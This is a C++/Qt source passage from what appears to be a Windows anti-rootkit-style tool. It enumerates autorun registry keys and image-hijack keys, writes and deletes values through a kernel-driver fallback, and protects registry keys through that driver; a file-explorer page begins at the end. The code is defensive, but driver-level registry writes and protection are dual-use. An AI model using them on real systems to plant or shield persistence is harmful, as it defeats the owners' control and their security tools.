            for (DWORD Index = 0; Index < SubKeyCount; ++Index)
            {
                DWORD NameLength = static_cast<DWORD>(Name.size());
                if (RegEnumKeyExW(Key, Index, Name.data(), &NameLength, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
                    continue;
                const QString ChildName = QString::fromWCharArray(Name.data(), NameLength);
                auto *Child = new QTreeWidgetItem(Parent, QStringList{ChildName});
                Child->setData(0, RootRole, RootIndex);
                Child->setData(0, PathRole, ParentPath.isEmpty() ? ChildName : ParentPath + "\\" + ChildName);
                Child->setData(0, LoadedRole, false);
                AddPlaceholder(Child);
            }
            RegCloseKey(Key);
        };

        const auto PopulateDialogValues = [&](QTreeWidgetItem *Item) {
            Values->setSortingEnabled(false);
            Values->clearContents();
            Values->setRowCount(0);
            if (!Item || Item->data(0, PlaceholderRole).toBool())
                return;
            const int RootIndex = Item->data(0, RootRole).toInt();
            const QString KeyPath = Item->data(0, PathRole).toString();
            const QString DisplayPath = RootNames[RootIndex] + (KeyPath.isEmpty() ? QString() : "\\" + KeyPath);
            PathLabel->setText(DisplayPath);
            Buttons->button(QDialogButtonBox::Ok)->setEnabled(true);

            HKEY Key = nullptr;
            if (RegOpenKeyExW(Roots[RootIndex], reinterpret_cast<LPCWSTR>(KeyPath.utf16()), 0,
                              KEY_QUERY_VALUE | KEY_WOW64_64KEY, &Key) != ERROR_SUCCESS)
                return;
            DWORD ValueCount = 0, MaximumNameLength = 0, MaximumDataLength = 0;
            RegQueryInfoKeyW(Key, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, &ValueCount,
                             &MaximumNameLength, &MaximumDataLength, nullptr, nullptr);
            std::vector<wchar_t> Name(static_cast<size_t>(MaximumNameLength) + 2);
            std::vector<BYTE> Data(static_cast<size_t>(MaximumDataLength) + sizeof(wchar_t) * 2);
            Values->setRowCount(static_cast<int>(ValueCount));
            int Row = 0;
            for (DWORD Index = 0; Index < ValueCount; ++Index)
            {
                DWORD NameLength = static_cast<DWORD>(Name.size());
                DWORD DataLength = static_cast<DWORD>(Data.size());
                DWORD Type = REG_NONE;
                if (RegEnumValueW(Key, Index, Name.data(), &NameLength, nullptr, &Type,
                                  Data.data(), &DataLength) != ERROR_SUCCESS)
                    continue;
                const QString ValueName = NameLength ? QString::fromWCharArray(Name.data(), NameLength) : "(Default)";
                const std::vector<BYTE> ValueData(Data.begin(), Data.begin() + DataLength);
                Values->setItem(Row, 0, new QTableWidgetItem(ValueName));
                Values->setItem(Row, 1, new QTableWidgetItem(TypeName(Type)));
                Values->setItem(Row, 2, new QTableWidgetItem(ValueDataText(Type, ValueData)));
                Values->setRowHeight(Row, 36);
                ++Row;
            }
            Values->setRowCount(Row);
            Values->setSortingEnabled(true);
            RegCloseKey(Key);
        };

        for (int Index = 0; Index < static_cast<int>(Roots.size()); ++Index)
        {
            auto *RootItem = new QTreeWidgetItem(KeyTree, QStringList{RootNames[Index]});
            RootItem->setData(0, RootRole, Index);
            RootItem->setData(0, PathRole, QString());
            RootItem->setData(0, LoadedRole, false);
            AddPlaceholder(RootItem);
        }
        QObject::connect(KeyTree, &QTreeWidget::itemExpanded, &Dialog,
                         [&LoadChildren](QTreeWidgetItem *Item) { LoadChildren(Item); });
        QObject::connect(KeyTree, &QTreeWidget::currentItemChanged, &Dialog,
                         [PopulateDialogValues](QTreeWidgetItem *Current, QTreeWidgetItem *) {
                             PopulateDialogValues(Current);
                         });
        QObject::connect(Buttons, &QDialogButtonBox::accepted, &Dialog, &QDialog::accept);
        QObject::connect(Buttons, &QDialogButtonBox::rejected, &Dialog, &QDialog::reject);

        RegistryLocation InitialLocation;
        int InitialRootIndex = 2;
        QString InitialSubKey;
        if (ParseLocation(AddressEdit->text(), InitialLocation))
        {
            InitialSubKey = InitialLocation.SubKey;
            for (int Index = 0; Index < static_cast<int>(Roots.size()); ++Index)
                if (Roots[Index] == InitialLocation.Root) InitialRootIndex = Index;
        }
        QTreeWidgetItem *Current = KeyTree->topLevelItem(InitialRootIndex);
        LoadChildren(Current);
        Current->setExpanded(true);
        for (const QString &Part : InitialSubKey.split('\\', Qt::SkipEmptyParts))
        {
            QTreeWidgetItem *Match = nullptr;
            for (int Index = 0; Index < Current->childCount(); ++Index)
                if (Current->child(Index)->text(0).compare(Part, Qt::CaseInsensitive) == 0)
                    Match = Current->child(Index);
            if (!Match) break;
            Current = Match;
            LoadChildren(Current);
            Current->setExpanded(true);
        }
        KeyTree->setCurrentItem(Current);
        KeyTree->scrollToItem(Current);

        if (Dialog.exec() != QDialog::Accepted)
            return;
        const QTreeWidgetItem *Selected = KeyTree->currentItem();
        if (!Selected || Selected->data(0, PlaceholderRole).toBool())
            return;
        const int RootIndex = Selected->data(0, RootRole).toInt();
        const QString KeyPath = Selected->data(0, PathRole).toString();
        const QString SelectedPath = RootNames[RootIndex] + (KeyPath.isEmpty() ? QString() : "\\" + KeyPath);
        AddressEdit->setText(SelectedPath);
        const int ComboIndex = PathCombo->findData(SelectedPath);
        if (ComboIndex >= 0)
        {
            const QSignalBlocker SourceBlocker(SourceCombo);
            const QSignalBlocker PathBlocker(PathCombo);
            SourceCombo->setCurrentIndex(0);
            PathCombo->setCurrentIndex(ComboIndex);
        }
        else
        {
            const QSignalBlocker SourceBlocker(SourceCombo);
            SourceCombo->setCurrentIndex(2);
        }
        RefreshValues();
    }

    void EnumerateKeyValues(HKEY Root, const QString &RootName, const QString &KeyPath,
                            const QString &Location)
    {
        HKEY Key = nullptr;
        if (RegOpenKeyExW(Root, reinterpret_cast<LPCWSTR>(KeyPath.utf16()), 0,
                          KEY_READ | KEY_WOW64_64KEY, &Key) != ERROR_SUCCESS)
            return;
        DWORD ValueCount = 0, MaximumNameLength = 0, MaximumDataLength = 0;
        RegQueryInfoKeyW(Key, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, &ValueCount,
                         &MaximumNameLength, &MaximumDataLength, nullptr, nullptr);
        std::vector<wchar_t> Name(static_cast<size_t>(MaximumNameLength) + 2);
        std::vector<BYTE> Data(static_cast<size_t>(MaximumDataLength) + sizeof(wchar_t) * 2);
        for (DWORD Index = 0; Index < ValueCount; ++Index)
        {
            DWORD NameLength = static_cast<DWORD>(Name.size());
            DWORD DataLength = static_cast<DWORD>(Data.size());
            DWORD Type = REG_NONE;
            const LSTATUS Status = RegEnumValueW(Key, Index, Name.data(), &NameLength, nullptr, &Type,
                                                 Data.data(), &DataLength);
            if (Status != ERROR_SUCCESS) continue;
            std::vector<BYTE> ValueData(Data.begin(), Data.begin() + DataLength);
            Rows.push_back({RootName, KeyPath, Location,
                            QString::fromWCharArray(Name.data(), NameLength),
                            ValueDataText(Type, ValueData), Type});
        }
        RegCloseKey(Key);
    }

    void RefreshValues()
    {
        Rows.clear();
        if (SourceCombo->currentIndex() == 0)
        {
            const QString SelectedStartupPath = PathCombo->currentData().toString();
            RegistryLocation SelectedLocation;
            if (!SelectedStartupPath.isEmpty() && ParseLocation(SelectedStartupPath, SelectedLocation))
            {
                EnumerateKeyValues(SelectedLocation.Root, SelectedLocation.RootName,
                                   SelectedLocation.SubKey, PathCombo->currentText());
            }
            else
            {
            const auto Add = [this](HKEY Root, const char *RootName, const char *Path, const char *Location) {
                EnumerateKeyValues(Root, QString::fromLatin1(RootName), QString::fromLatin1(Path),
                                   QString::fromLatin1(Location));
            };
            Add(HKEY_CURRENT_USER, "HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Current user / Run");
            Add(HKEY_CURRENT_USER, "HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Current user / RunOnce");
            Add(HKEY_CURRENT_USER, "HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "Current user / RunServices");
            Add(HKEY_CURRENT_USER, "HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "Current user / RunServicesOnce");
            Add(HKEY_LOCAL_MACHINE, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "All users / Run");
            Add(HKEY_LOCAL_MACHINE, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "All users / RunOnce");
            Add(HKEY_LOCAL_MACHINE, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices", "All users / RunServices");
            Add(HKEY_LOCAL_MACHINE, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "All users / RunServicesOnce");
            Add(HKEY_CURRENT_USER, "HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "Current user / Explorer policy");
            Add(HKEY_LOCAL_MACHINE, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "All users / Explorer policy");
            Add(HKEY_USERS, "HKU", ".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Default user / Run");
            Add(HKEY_LOCAL_MACHINE, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Winlogon");
            }
        }
        else if (SourceCombo->currentIndex() == 1)
        {
            const QString BasePath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
            HKEY BaseKey = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, reinterpret_cast<LPCWSTR>(BasePath.utf16()), 0,
                              KEY_READ | KEY_WOW64_64KEY, &BaseKey) == ERROR_SUCCESS)
            {
                DWORD SubKeyCount = 0, MaximumNameLength = 0;
                RegQueryInfoKeyW(BaseKey, nullptr, nullptr, nullptr, &SubKeyCount, &MaximumNameLength,
                                 nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
                std::vector<wchar_t> Name(static_cast<size_t>(MaximumNameLength) + 2);
                for (DWORD Index = 0; Index < SubKeyCount; ++Index)
                {
                    DWORD NameLength = static_cast<DWORD>(Name.size());
                    if (RegEnumKeyExW(BaseKey, Index, Name.data(), &NameLength, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
                        EnumerateKeyValues(HKEY_LOCAL_MACHINE, "HKLM", BasePath + "\\" +
                                           QString::fromWCharArray(Name.data(), NameLength), "Image hijack");
                }
                RegCloseKey(BaseKey);
            }
        }
        else
        {
            RegistryLocation Location;
            if (ParseLocation(AddressEdit->text(), Location))
                EnumerateKeyValues(Location.Root, Location.RootName, Location.SubKey, "Selected path");
        }
        std::sort(Rows.begin(), Rows.end(), [](const RegistryValueRow &Left, const RegistryValueRow &Right) {
            const int LocationCompare = Left.Location.compare(Right.Location, Qt::CaseInsensitive);
            if (LocationCompare != 0) return LocationCompare < 0;
            const int KeyCompare = (Left.RootName + Left.KeyPath).compare(Right.RootName + Right.KeyPath, Qt::CaseInsensitive);
            return KeyCompare == 0 ? Left.Name.compare(Right.Name, Qt::CaseInsensitive) < 0 : KeyCompare < 0;
        });
        PopulateValues();
    }

    void PopulateValues()
    {
        const QString Query = SearchEdit->text().trimmed();
        ValueTable->setSortingEnabled(false);
        ValueTable->clearContents(); ValueTable->setRowCount(0);
        int VisibleCount = 0;
        for (int Index = 0; Index < static_cast<int>(Rows.size()); ++Index)
        {
            const RegistryValueRow &Value = Rows[Index];
            const QString SearchText = Value.RootName + " " + Value.Location + " " + Value.KeyPath + " " + Value.Name +
                                       " " + TypeName(Value.Type) + " " + Value.Data;
            if (!Query.isEmpty() && !SearchText.contains(Query, Qt::CaseInsensitive)) continue;
            const int Row = ValueTable->rowCount(); ValueTable->insertRow(Row);
            auto *LocationItem = new QTableWidgetItem(Value.Location);
            LocationItem->setData(Qt::UserRole, Index);
            ValueTable->setItem(Row, 0, LocationItem);
            ValueTable->setItem(Row, 1, new QTableWidgetItem(Value.RootName + "\\" + Value.KeyPath));
            ValueTable->setItem(Row, 2, new QTableWidgetItem(Value.Name.isEmpty() ? "(Default)" : Value.Name));
            ValueTable->setItem(Row, 3, new QTableWidgetItem(TypeName(Value.Type)));
            ValueTable->setItem(Row, 4, new QTableWidgetItem(Value.Data));
            ValueTable->setRowHeight(Row, 38);
            ++VisibleCount;
        }
        ValueTable->setSortingEnabled(true);
        ValueCountLabel->setText(Query.isEmpty()
            ? QString("%1 value%2").arg(Rows.size()).arg(Rows.size() == 1 ? "" : "s")
            : QString("%1 of %2").arg(VisibleCount).arg(Rows.size()));
        ModifyButton->setEnabled(false); DeleteButton->setEnabled(false);
    }

    const RegistryValueRow *SelectedValue() const
    {
        const QModelIndexList Selection = ValueTable->selectionModel()->selectedRows(0);
        if (Selection.isEmpty()) return nullptr;
        const int Index = Selection.first().data(Qt::UserRole).toInt();
        return Index >= 0 && Index < static_cast<int>(Rows.size()) ? &Rows[Index] : nullptr;
    }

    void ShowCreateKeyDialog()
    {
        RegistryLocation Location;
        if (!ParseLocation(AddressEdit->text(), Location))
        { ShowErrorNotice(this, "Registry", "Enter a valid HKLM, HKCU, HKU, HKCR, or HKCC path."); return; }
        auto *Dialog = new MessageBoxBase(window()); Dialog->setAttribute(Qt::WA_DeleteOnClose);
        auto *Name = new LineEdit; Name->setPlaceholderText("Child key name");
        Dialog->viewLayout()->addWidget(MakeLabel("New registry key", 18, KTextPrimary, QFont::DemiBold));
        Dialog->viewLayout()->addWidget(MakeLabel(Location.RootName + "\\" + Location.SubKey, 11, KTextMuted));
        Dialog->viewLayout()->addWidget(Name); Dialog->yesButton()->setText("Create");
        QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog, [this, Dialog, Name, Location] {
            const QString ChildName = Name->text().trimmed();
            if (ChildName.isEmpty()) { ShowWarningNotice(this, "Registry", "Enter a key name."); return; }
            const QString Path = Location.SubKey.isEmpty() ? ChildName : Location.SubKey + "\\" + ChildName;
            DWORD Status = ERROR_GEN_FAILURE;
            const bool Success = CreateRegistryKeyWithFallback(Location, Path, Status);
            Dialog->accept();
            if (Success) { AddressEdit->setText(Location.RootName + "\\" + Path); RefreshValues(); ShowSuccessNotice(this, "Registry", "Registry key created."); }
            else ShowErrorNotice(this, "Registry", QString("Unable to create key (error %1).").arg(Status));
        });
        QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject); Dialog->show();
    }

    static int TypeIndex(DWORD Type)
    {
        switch (Type) { case REG_SZ: return 0; case REG_EXPAND_SZ: return 1; case REG_DWORD: return 2;
        case REG_QWORD: return 3; case REG_MULTI_SZ: return 4; case REG_BINARY: return 5; default: return 0; }
    }

    static DWORD TypeFromIndex(int Index)
    {
        static const std::array<DWORD, 6> Types{REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_QWORD, REG_MULTI_SZ, REG_BINARY};
        return Index >= 0 && Index < static_cast<int>(Types.size()) ? Types[Index] : REG_SZ;
    }

    bool EncodeValueData(DWORD Type, const QString &Text, std::vector<BYTE> &Data) const
    {
        if (Type == REG_SZ || Type == REG_EXPAND_SZ)
        {
            const std::wstring Value = Text.toStdWString();
            Data.resize((Value.size() + 1) * sizeof(wchar_t)); std::memcpy(Data.data(), Value.c_str(), Data.size()); return true;
        }
        if (Type == REG_DWORD || Type == REG_QWORD)
        {
            bool Ok = false; const qulonglong Value = Text.trimmed().toULongLong(&Ok, 0); if (!Ok) return false;
            if (Type == REG_DWORD) { const DWORD Number = static_cast<DWORD>(Value); Data.resize(sizeof(Number)); std::memcpy(Data.data(), &Number, sizeof(Number)); }
            else { const ULONGLONG Number = Value; Data.resize(sizeof(Number)); std::memcpy(Data.data(), &Number, sizeof(Number)); }
            return true;
        }
        if (Type == REG_MULTI_SZ)
        {
            const QStringList Values = Text.split('\n', Qt::SkipEmptyParts); std::vector<wchar_t> Buffer;
            for (const QString &Value : Values) { const std::wstring Wide = Value.trimmed().toStdWString(); Buffer.insert(Buffer.end(), Wide.begin(), Wide.end()); Buffer.push_back(L'\0'); }
            Buffer.push_back(L'\0'); Data.resize(Buffer.size() * sizeof(wchar_t)); std::memcpy(Data.data(), Buffer.data(), Data.size()); return true;
        }
        QString Hex = Text; Hex.remove(' '); Hex.remove(','); Hex.remove('-'); Hex.replace("0x", "", Qt::CaseInsensitive);
        if (Hex.size() % 2 != 0) return false; Data.clear();
        for (qsizetype Index = 0; Index < Hex.size(); Index += 2) { bool Ok = false; const int Value = Hex.mid(Index, 2).toInt(&Ok, 16); if (!Ok) return false; Data.push_back(static_cast<BYTE>(Value)); }
        return true;
    }

    void ShowValueDialog(bool Editing)
    {
        RegistryLocation Location;
        QString InitialName, InitialData; DWORD InitialType = REG_SZ;
        if (Editing)
        {
            const RegistryValueRow *Selected = SelectedValue(); if (!Selected) return;
            if (!ParseLocation(Selected->RootName + "\\" + Selected->KeyPath, Location)) return;
            InitialName = Selected->Name; InitialData = Selected->Data; InitialType = Selected->Type;
            if (InitialType == REG_DWORD || InitialType == REG_QWORD) InitialData = InitialData.section(' ', 0, 0);
        }
        else if (!ParseLocation(AddressEdit->text(), Location))
        { ShowErrorNotice(this, "Registry", "Enter a valid registry key path first."); return; }
        auto *Dialog = new MessageBoxBase(window()); Dialog->setAttribute(Qt::WA_DeleteOnClose);
        auto *Name = new LineEdit; Name->setPlaceholderText("Value name (empty for Default)"); Name->setText(InitialName); Name->setEnabled(!Editing);
        auto *Type = new ComboBox; Type->addItems({"String (REG_SZ)", "Expandable string", "DWORD", "QWORD", "Multi-string", "Binary"}); Type->setCurrentIndex(Editing ? TypeIndex(InitialType) : 0);
        auto *Data = new PlainTextEdit; Data->setPlaceholderText("Value data"); Data->setPlainText(InitialData); Data->setMinimumHeight(120);
        Dialog->viewLayout()->addWidget(MakeLabel(Editing ? "Modify registry value" : "New registry value", 18, KTextPrimary, QFont::DemiBold));
        Dialog->viewLayout()->addWidget(MakeLabel(Location.RootName + "\\" + Location.SubKey, 11, KTextMuted));
        Dialog->viewLayout()->addWidget(Name); Dialog->viewLayout()->addWidget(Type); Dialog->viewLayout()->addWidget(Data);
        Dialog->yesButton()->setText(Editing ? "Save" : "Create");
        QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog, [this, Dialog, Name, Type, Data, Location] {
            std::vector<BYTE> Buffer; const DWORD ValueType = TypeFromIndex(Type->currentIndex());
            if (!EncodeValueData(ValueType, Data->toPlainText(), Buffer)) { ShowWarningNotice(this, "Registry", "The value data format is invalid."); return; }
            DWORD Status = ERROR_GEN_FAILURE;
            const bool Success = SetRegistryValueWithFallback(Location, Name->text(), ValueType, Buffer, Status);
            Dialog->accept();
            if (Success) { RefreshValues(); ShowSuccessNotice(this, "Registry", "Registry value saved."); }
            else ShowErrorNotice(this, "Registry", QString("Unable to save value (error %1).").arg(Status));
        });
        QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject); Dialog->show();
    }

    void DeleteSelectedValue()
    {
        const RegistryValueRow *Selected = SelectedValue(); if (!Selected) return;
        const RegistryValueRow Value = *Selected;
        if (QMessageBox::warning(this, "Registry", QString("Delete value '%1' from %2\\%3?").arg(Value.Name.isEmpty() ? "(Default)" : Value.Name, Value.RootName, Value.KeyPath), QMessageBox::Yes | QMessageBox::No, QMessageBox::No) != QMessageBox::Yes) return;
        RegistryLocation Location; if (!ParseLocation(Value.RootName + "\\" + Value.KeyPath, Location)) return;
        DWORD Status = ERROR_GEN_FAILURE;
        if (DeleteRegistryValueWithFallback(Location, Value.Name, Status)) { RefreshValues(); ShowSuccessNotice(this, "Registry", "Registry value deleted."); }
        else ShowErrorNotice(this, "Registry", QString("Unable to delete value (error %1).").arg(Status));
    }

    QString CurrentUserSid() const
    {
        HANDLE Token = nullptr; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &Token)) return {};
        DWORD Size = 0; GetTokenInformation(Token, TokenUser, nullptr, 0, &Size); std::vector<BYTE> Buffer(Size);
        QString Sid; if (GetTokenInformation(Token, TokenUser, Buffer.data(), Size, &Size)) { LPWSTR Text = nullptr; if (ConvertSidToStringSidW(reinterpret_cast<TOKEN_USER *>(Buffer.data())->User.Sid, &Text)) { Sid = QString::fromWCharArray(Text); LocalFree(Text); } }
        CloseHandle(Token); return Sid;
    }

    bool ToKernelRegistryPath(const QString &Input, QString &KernelPath) const
    {
        QString Path = Input.trimmed().replace('/', '\\');
        if (Path.startsWith("\\Registry\\", Qt::CaseInsensitive)) { KernelPath = Path; return true; }
        RegistryLocation Location; if (!ParseLocation(Path, Location)) return false;
        if (Location.Root == HKEY_LOCAL_MACHINE) KernelPath = "\\Registry\\Machine";
        else if (Location.Root == HKEY_CURRENT_USER) { const QString Sid = CurrentUserSid(); if (Sid.isEmpty()) return false; KernelPath = "\\Registry\\User\\" + Sid; }
        else if (Location.Root == HKEY_USERS) KernelPath = "\\Registry\\User";
        else if (Location.Root == HKEY_CLASSES_ROOT) KernelPath = "\\Registry\\Machine\\Software\\Classes";
        else if (Location.Root == HKEY_CURRENT_CONFIG) KernelPath = "\\Registry\\Machine\\System\\CurrentControlSet\\Hardware Profiles\\Current";
        else return false;
        if (!Location.SubKey.isEmpty()) KernelPath += "\\" + Location.SubKey;
        return true;
    }

    bool CreateRegistryKeyWithFallback(const RegistryLocation &Location, const QString &Path, DWORD &Status)
    {
        QString KernelPath;
        if (ToKernelRegistryPath(Location.RootName + "\\" + Path, KernelPath))
        {
            const std::wstring WidePath = KernelPath.toStdWString();
            if (RegCreateKeyKernel(WidePath.c_str()))
            {
                Status = ERROR_SUCCESS;
                return true;
            }
            Status = G_LastMultiDrvError;
        }
        HKEY Key = nullptr;
        DWORD Disposition = 0;
        const LSTATUS UserStatus = RegCreateKeyExW(Location.Root, reinterpret_cast<LPCWSTR>(Path.utf16()), 0,
            nullptr, 0, KEY_READ | KEY_WRITE | KEY_WOW64_64KEY, nullptr, &Key, &Disposition);
        if (Key)
            RegCloseKey(Key);
        Status = UserStatus;
        return UserStatus == ERROR_SUCCESS;
    }

    bool SetRegistryValueWithFallback(const RegistryLocation &Location, const QString &ValueName,
                                      DWORD ValueType, const std::vector<BYTE> &Buffer, DWORD &Status)
    {
        QString KernelPath;
        if (ToKernelRegistryPath(Location.RootName + "\\" + Location.SubKey, KernelPath))
        {
            const std::wstring WidePath = KernelPath.toStdWString();
            const std::wstring WideName = ValueName.toStdWString();
            if (RegSetValueKernel(WidePath.c_str(), WideName.c_str(), ValueType,
                                  const_cast<BYTE *>(Buffer.data()), static_cast<ULONG>(Buffer.size())))
            {
                Status = ERROR_SUCCESS;
                return true;
            }
            Status = G_LastMultiDrvError;
        }
        HKEY Key = nullptr;
        const LSTATUS OpenStatus = RegOpenKeyExW(Location.Root, reinterpret_cast<LPCWSTR>(Location.SubKey.utf16()), 0,
            KEY_SET_VALUE | KEY_WOW64_64KEY, &Key);
        if (OpenStatus != ERROR_SUCCESS)
        {
            Status = OpenStatus;
            return false;
        }
        const LSTATUS UserStatus = RegSetValueExW(Key, reinterpret_cast<LPCWSTR>(ValueName.utf16()), 0, ValueType,
            Buffer.data(), static_cast<DWORD>(Buffer.size()));
        RegCloseKey(Key);
        Status = UserStatus;
        return UserStatus == ERROR_SUCCESS;
    }

    bool DeleteRegistryValueWithFallback(const RegistryLocation &Location, const QString &ValueName, DWORD &Status)
    {
        QString KernelPath;
        if (ToKernelRegistryPath(Location.RootName + "\\" + Location.SubKey, KernelPath))
        {
            const std::wstring WidePath = KernelPath.toStdWString();
            const std::wstring WideName = ValueName.toStdWString();
            if (RegDeleteValueKernel(WidePath.c_str(), WideName.c_str()))
            {
                Status = ERROR_SUCCESS;
                return true;
            }
            Status = G_LastMultiDrvError;
        }
        HKEY Key = nullptr;
        const LSTATUS OpenStatus = RegOpenKeyExW(Location.Root, reinterpret_cast<LPCWSTR>(Location.SubKey.utf16()), 0,
            KEY_SET_VALUE | KEY_WOW64_64KEY, &Key);
        if (OpenStatus != ERROR_SUCCESS)
        {
            Status = OpenStatus;
            return false;
        }
        const LSTATUS UserStatus = RegDeleteValueW(Key, reinterpret_cast<LPCWSTR>(ValueName.utf16()));
        RegCloseKey(Key);
        Status = UserStatus;
        return UserStatus == ERROR_SUCCESS;
    }

    void ProtectAddress()
    {
        const QString DisplayPath = AddressEdit->text().trimmed(); QString KernelPath;
        if (!ToKernelRegistryPath(DisplayPath, KernelPath)) { ShowErrorNotice(this, "Registry", "Unable to convert the registry address to a kernel path."); return; }
        const std::wstring WidePath = KernelPath.toStdWString(); ProtectRegistryKey(WidePath.c_str());
        if (G_LastMultiDrvError != ERROR_SUCCESS) { ShowErrorNotice(this, "Registry", QString("Protection failed (error %1).").arg(G_LastMultiDrvError)); return; }
        const auto Match = std::find_if(ProtectedEntries.begin(), ProtectedEntries.end(), [&KernelPath](const ProtectedRegistryEntry &Entry) { return Entry.KernelPath.compare(KernelPath, Qt::CaseInsensitive) == 0; });
        if (Match == ProtectedEntries.end()) ProtectedEntries.append({DisplayPath, KernelPath});
        RefreshProtectedTable(); ShowSuccessNotice(this, "Registry", "Registry path protected.");
    }

    void RefreshProtectedTable()
    {
        const QString Query = ProtectedSearchEdit ? ProtectedSearchEdit->text().trimmed() : QString();
        ProtectedTable->setSortingEnabled(false);
        ProtectedTable->clearContents();
        ProtectedTable->setRowCount(0);
        int VisibleCount = 0;
        for (const ProtectedRegistryEntry &Entry : ProtectedEntries) {
            if (!Query.isEmpty() && !(Entry.DisplayPath + " " + Entry.KernelPath).contains(Query, Qt::CaseInsensitive))
                continue;
            const int Row = ProtectedTable->rowCount();
            ProtectedTable->insertRow(Row);
            auto *Item = new QTableWidgetItem(Entry.DisplayPath);
            Item->setData(Qt::UserRole, Entry.KernelPath);
            ProtectedTable->setItem(Row, 0, Item);
            ProtectedTable->setItem(Row, 1, new QTableWidgetItem(Entry.KernelPath));
            ProtectedTable->setRowHeight(Row, 38);
            ++VisibleCount;
        }
        ProtectedTable->setSortingEnabled(true);
        if (ProtectedCountLabel)
            ProtectedCountLabel->setText(Query.isEmpty()
                ? QString("%1 path%2").arg(ProtectedEntries.size()).arg(ProtectedEntries.size() == 1 ? "" : "s")
                : QString("%1 of %2").arg(VisibleCount).arg(ProtectedEntries.size()));
        UnprotectButton->setEnabled(false);
    }

    void UnprotectSelection()
    {
        QList<QString> KernelPaths; for (const QModelIndex &Index : ProtectedTable->selectionModel()->selectedRows(0)) KernelPaths.append(Index.data(Qt::UserRole).toString());
        if (KernelPaths.isEmpty()) return; QStringList Failures;
        for (const QString &KernelPath : KernelPaths) { const std::wstring WidePath = KernelPath.toStdWString(); UnprotectRegistryKey(WidePath.c_str()); if (G_LastMultiDrvError != ERROR_SUCCESS) Failures.append(KernelPath); else { const auto Match = std::find_if(ProtectedEntries.begin(), ProtectedEntries.end(), [&KernelPath](const ProtectedRegistryEntry &Entry) { return Entry.KernelPath.compare(KernelPath, Qt::CaseInsensitive) == 0; }); if (Match != ProtectedEntries.end()) ProtectedEntries.erase(Match); } }
        RefreshProtectedTable();
        if (Failures.isEmpty()) ShowSuccessNotice(this, "Registry", QString("Unprotected %1 registry path(s).").arg(KernelPaths.size()));
        else ShowErrorNotice(this, "Registry", "Failed to unprotect:\n" + Failures.join('\n'));
    }

    ComboBox *SourceCombo = nullptr;
    ComboBox *PathCombo = nullptr;
    LineEdit *AddressEdit = nullptr;
    SearchLineEdit *SearchEdit = nullptr;
    BodyLabel *ValueCountLabel = nullptr;
    TableWidget *ValueTable = nullptr;
    PushButton *ModifyButton = nullptr;
    PushButton *DeleteButton = nullptr;
    TableWidget *ProtectedTable = nullptr;
    SearchLineEdit *ProtectedSearchEdit = nullptr;
    BodyLabel *ProtectedCountLabel = nullptr;
    PushButton *UnprotectButton = nullptr;
    std::vector<RegistryValueRow> Rows;
    QList<ProtectedRegistryEntry> ProtectedEntries;
};

QWidget *CreateRegistryPage()
{
    return new RegistryManagerPage;
}

class FileExplorerPage final : public QWidget
{
    struct ProtectedFileEntry
    {
        QString DisplayPath;
        QString NtPath;
    };

    struct FileMonitorEntry
    {
        QString Timestamp;
        QString Operation;
        QString Process;
        QString Path;
        QString Detail;
        DWORD ProcessId = 0;
        DWORD ThreadId = 0;
    };

  public:
    explicit FileExplorerPage(QWidget *Parent = nullptr)
        : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this);
        ConfigurePageLayout(Layout, 10);

        auto *Tabs = new TabBar;
        Tabs->setAddButtonVisible(false);
        Tabs->setTabsClosable(false);
        Tabs->setMovable(false);
        Tabs->addTab("explorer", "Explorer", Fluent::IconType::FOLDER);
        Tabs->addTab("protected", "ProtectedFiles", Fluent::IconType::CERTIFICATE);
        Tabs->addTab("monitor", "Monitor", Fluent::IconType::COMMAND_PROMPT);
        Tabs->setCurrentIndex(0);
        Layout->addWidget(Tabs);
        TabBarWidget = Tabs;

        Pages = new QStackedWidget;
        auto *ExplorerPage = new QWidget;
        auto *ExplorerLayout = new QVBoxLayout(ExplorerPage);
        ConfigurePageLayout(ExplorerLayout, 10);

        auto *NavigationLayout = new QHBoxLayout;
        ConfigureToolbarLayout(NavigationLayout);
        BackButton = CreateNavigationButton(Fluent::IconType::LEFT_ARROW, "Back");
        ForwardButton = CreateNavigationButton(Fluent::IconType::RIGHT_ARROW, "Forward");
        UpButton = CreateNavigationButton(Fluent::IconType::UP, "Up one level");
        RefreshButton = CreateNavigationButton(Fluent::IconType::SYNC, "Refresh");
        AddressEdit = new LineEdit;
        AddressEdit->setPlaceholderText("Path");
        SearchEdit = new SearchLineEdit;
        SearchEdit->setPlaceholderText("Search this folder");
        SearchEdit->setClearButtonEnabled(true);
        SearchEdit->setMaximumWidth(280);
        NavigationLayout->addWidget(BackButton);
        NavigationLayout->addWidget(ForwardButton);
        NavigationLayout->addWidget(UpButton);
        NavigationLayout->addWidget(RefreshButton);
        NavigationLayout->addWidget(AddressEdit, 1);
        NavigationLayout->addWidget(SearchEdit);
